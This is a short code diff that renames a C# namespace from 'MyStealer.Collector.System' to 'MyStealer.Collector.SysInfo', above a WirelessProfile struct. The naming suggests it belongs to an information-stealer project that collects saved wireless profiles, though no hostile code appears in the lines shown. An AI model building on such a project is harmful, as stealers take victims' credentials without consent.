@@ -1,4 +1,4 @@
-﻿namespace MyStealer.Collector.System
+﻿namespace MyStealer.Collector.SysInfo
 {
     public struct WirelessProfile
     {
